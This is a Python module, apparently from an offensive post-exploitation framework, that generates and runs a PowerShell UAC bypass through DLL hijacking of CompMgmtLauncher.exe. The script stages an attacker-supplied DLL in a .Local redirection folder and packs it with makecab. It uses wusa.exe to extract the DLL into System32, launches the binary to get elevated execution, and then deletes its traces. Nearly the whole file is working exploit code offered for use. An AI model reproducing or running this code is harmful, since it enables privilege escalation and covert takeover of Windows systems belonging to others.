from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "invoke-compmgmtlauncher",
                       "Description": "UAC bypass through DLL Hijacking method (compmgmtlauncher binary)",
                       "Author": "@pablogonzalezpe"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "dll": [None, "DLL name", True],
                   "base": [None, "DLL path", True],
                   "common-control": ["x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2", "DLL folder name winsxs", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """function invoke-compmgmtlauncher{{
param(
    [Parameter(Mandatory)]
    [string] $dll,
    [Parameter(Mandatory)]
    [String] $base
)

$file = "\$dll"
$path = $base
$evil = $(echo $path$file)
$dst = $(echo "$evil.cab")

#Create Directory
mkdir "$path\compMgmtLauncher.exe.Local"
$path1 =  "$path\compMgmtLauncher.exe.Local"
mkdir $path1\\{0}
$path = "$path1\\{0}"
cp $evil $path

#Create DDF File
$texto = ".OPTION EXPLICIT       

.Set CabinetNameTemplate=mycab.CAB
.Set DiskDirectoryTemplate=.
    
.Set Cabinet=on
.Set Compress=on
.Set DestinationDir=compMgmtLauncher.exe.Local\\{0}
""compMgmtLauncher.exe.Local\\{0}\{1}\"""

$MyPath = "$base\proof.ddf"
$texto | Out-File -Encoding "UTF8" $MyPath

#CAB File
cd $base
makecab.exe /f $MyPath
rm $MyPath\setup*

#WUSA Copy
wusa.exe "$base\mycab.CAB" /extract:c:\Windows\System32 

#Run Process
Start-Process C:\Windows\system32\CompMgmtLauncher.exe

#Remove folder and CAB file
rm "$base\mycab.CAB" 
rm "$base\proof.ddf"
rm "$base\setup*"
rm -Force $path1 -Recurse

}}
""".format(self.args["common-control"], self.args["dll"])
            
        function += 'invoke-compmgmtlauncher -dll "{}" -base "{}"'.format(self.args["dll"], self.args["base"])
        super(CustomModule, self).run(function)